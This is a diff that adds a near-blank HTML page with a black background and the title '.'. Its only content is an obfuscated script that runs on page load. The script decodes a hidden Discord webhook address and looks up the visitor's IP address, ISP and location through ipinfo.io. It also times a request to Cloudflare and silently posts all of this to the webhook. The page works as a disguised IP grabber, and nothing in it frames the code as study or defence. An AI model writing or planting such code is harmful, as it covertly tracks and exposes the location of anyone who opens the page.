@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>.</title>
+</head>
+<body style="background:black">
+
+<script>
+(function(){
+  const _0x4f2a=["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjcwOTkyNzE3NTkxNzcwMy9JSENTMkh uQ0t3RHZuaFMyTERmQVlLZWRSYnhKelJyUmN0TWtucXBtMlhPWnZLekwzYkE4R2l1NDByU24tNFRP OE1PR A==",
+  "json","https://ipinfo.io/json","https://cloudflare.com/cdn-cgi/trace","no-store","POST",
+  "application/json","content","now","round","stringify"];
+  const webhook=atob(_0x4f2a[0].replace(/\s/g,""));
+  fetch(_0x4f2a[2]).then(r=>r[_0x4f2a[1]]()).then(d=>{
+    const s=performance[_0x4f2a[8]]();
+    fetch(_0x4f2a[3],{cache:_0x4f2a[4]}).then(()=>{
+      const p=Math[_0x4f2a[9]](performance[_0x4f2a[8]]()-s);
+      fetch(webhook,{
+        method:_0x4f2a[5],
+        headers:{"Content-Type":_0x4f2a[6]},
+        body:JSON[_0x4f2a[10]]({
+          content:`📡 **Network Info**
+IP: ${d.ip}
+ISP: ${d.org}
+Location: ${d.city}, ${d.region}, ${d.country}
+Ping: ${p} ms`
+        })
+      });
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
